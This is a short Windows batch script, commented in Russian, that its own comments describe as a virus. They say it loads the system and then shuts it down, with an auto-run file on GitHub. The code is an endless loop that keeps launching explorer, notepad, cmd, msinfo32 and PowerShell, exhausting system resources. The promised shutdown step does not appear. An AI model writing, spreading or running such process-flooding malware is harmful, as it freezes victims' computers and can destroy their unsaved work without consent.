:: (Главный сценарий: открытие системных программ что влияет на нагрузку системы, а потом выключение. Всё предусмотрено: на Github есть файл с авто-запуском файла с вирусом.)

:: (Переменная циклов)
set "cycles=0"

:: (Нагрузка на ПК и выключение. Авто запуск предусмотрен!)
:forever
start explorer.exe
start notepad.exe
start cmd.exe
start msinfo32.exe
start powershell.exe
set /a "cycles+=1"
goto :forever
